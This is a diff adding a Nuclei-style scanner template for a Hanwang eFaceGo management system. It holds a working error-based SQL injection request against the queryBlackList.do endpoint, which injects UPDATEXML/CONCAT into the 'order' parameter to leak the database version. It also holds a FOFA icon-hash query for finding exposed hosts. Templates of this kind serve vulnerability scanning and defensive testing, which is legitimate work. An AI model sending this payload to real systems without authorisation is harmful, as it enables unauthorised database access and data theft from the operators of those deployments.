@@ -1,0 +1,33 @@
+id: hanwang-queryBlackList-sqli
+info:
+  name: hanwang queryBlackList.do - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1380907357"
+    tips:
+    repair:
+    version:
+  tags: hanwang,efacego,sqli
+
+http:
+  - raw:
+      - |
+        GET /manage/systemBlackList/queryBlackList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,(SELECT+(ELT(2920=2920,1))),0x7e),8357)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: queryBlackList.do
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH syntax error')
+        condition: and
+
+
